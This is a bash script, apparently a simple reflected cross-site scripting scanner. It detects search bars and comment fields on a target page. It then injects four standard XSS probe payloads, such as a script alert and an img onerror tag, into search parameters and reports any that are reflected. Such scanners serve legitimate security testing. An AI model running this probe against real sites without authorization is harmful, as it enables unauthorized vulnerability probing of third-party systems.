#!/bin/bash

# clear the screen
clear

# Variables
target=$1
response_code=$(curl -s -o /dev/null -w "%{http_code}" "$target")

# Define color codes
RED='\e[0;31m'
GREEN='\e[0;32m'
YELLOW='\e[33m'
BLUE='\e[0;34m'
MAGENTA='\e[0;35m'
CYAN='\e[0;36m'
WHITE='\e[1;37m'
BLACK='\e[30m'
BG_RED="\e[1;41m"
BG_GREEN="\e[42m"
BG_YELLOW="\e[43m"
BG_BLUE="\e[1;44m"
BG_PURPLE="\e[45m"
BG_WHITE='\e[47m'
BG_CYAN="\e[0;46m"
RESET='\e[0m'
BOLD='\e[1m'
UNDERLINE='\e[4m'

# Functions

# Banner function to display information about the target
function BANNER() {
    echo "      _,  , __,  __, _______,    ,___ "
    echo "     ( |,' (    (   (  /  / |   /   / "
    echo "       +    '.   '.   /  /--|  /  __  "
    echo "    _,'|__(___)(___)_/ _/   |_(___/   "
    echo "                         By Trabbit   "
    echo "-------------------------------------------------------------------"
    echo "  Target: $target"
    echo "  Response Code: $response_code"
    echo "-------------------------------------------------------------------"
    echo
}

# Check if the target URL is provided
function CHECK_CONFIGS() {
    if [[ -z "$target" ]]; then
        echo -e "${RED}Please provide a target!${RESET}"
        exit 0
    fi
}

# Simplified search bar check based on the presence of the word "search"
function SBAR_CHECK() {
    # Get the HTML content and search for the word "search" in relevant tags or attributes
    search_bar=$(curl -sL "$target" | grep -i -oP '(?:<form[^>]*>.*|<input[^>]+)[^>]*(name|id|class)=[^>]*search[^>]*')

    if [[ -z "$search_bar" ]]; then
        echo -e "[${RED}-${RESET}] No search bar detected."
    else
        echo -e "[${GREEN}+${RESET}] Search bar detected!"
        echo -e "[${GREEN}+${RESET}] HTML snippet containing 'search':\n\n${GREEN}$search_bar${RESET}\n"
    fi

    # Prompt the user to provide the full URL
    read -p "Please provide the full URL (e.g., https://example.com/search?s=test): " search_url

    # Define a list of multiple XSS payloads
    XSS_PAYLOADS=(
        "<h1>xss</h1>"
        "<script>alert('XSS')</script>"
        "<img src='x' onerror='alert(1)'>"
        "<a href='javascript:alert(1)'>click me</a>"
    )

    # Extract all parameters from the URL
    params=$(echo $search_url | sed -E 's/^[^?]+\?//')

    # Loop through all parameters and inject the XSS payloads into search-related ones
    for param in $(echo $params | tr '&' '\n'); do
        # Extract parameter name and value
        key=$(echo $param | cut -d'=' -f1)

        # If the key is one of the common search-related parameters, replace its value with the XSS payload
        if [[ "$key" == "s" || "$key" == "q" || "$key" == "search" || "$key" == "query" || "$key" == "keyword" ]]; then
            # Display the testing message once
            echo -e "--------------------------------------------------"
            echo -e "[${BLUE}*${RESET}] Testing URL with XSS payloads..."
            echo -e "--------------------------------------------------"

            # Iterate through each payload and test
            for XSS_PAYLOAD in "${XSS_PAYLOADS[@]}"; do
                # Replace the value of the search parameter with each XSS payload
                modified_url=$(echo $search_url | sed "s#$key=[^&]*#$key=$XSS_PAYLOAD#")

                # Send the request with the XSS payload
                response=$(curl -sL "$modified_url")

                # Check if the XSS payload appears as text (indicating reflection)
                if echo "$response" | grep -q "$XSS_PAYLOAD"; then
                    echo -e "[${GREEN}+${RESET}] Vulnerability found with payload: $XSS_PAYLOAD"
                fi
            done
            echo -e "[ ${YELLOW}done${RESET} ]"

            # Add space before displaying other inputs
            echo "" # Adds a blank line for spacing
            echo -e "-----------------------------------------------------------------------------"
        fi
    done
}

# Function to check for a comments section
function CHECK_COMMENTS() {
    # Get the HTML content and search for elements that indicate a comment section
    comment_section=$(curl -sL "$target" | grep -i -oP '<(textarea|input)[^>]*(class|name|id)?=["'"'"'][^"'"'"'>]*(comment|feedback|reply|message|review)[^"'"'"'>]*')

    # Check if any comment-related section is found
    if [[ -n "$comment_section" ]]; then
        echo -e "[${GREEN}+${RESET}] Comment section detected!"
        echo -e "[${GREEN}+${RESET}] HTML snippet containing comment-related elements:\n\n${GREEN}$comment_section${RESET}\n"
    else
        echo -e "[${RED}-${RESET}] No comment section detected."
    fi
}

# main function
main() {
    clear
    BANNER
    CHECK_CONFIGS
    SBAR_CHECK
    CHECK_COMMENTS
}

# call the main function
main
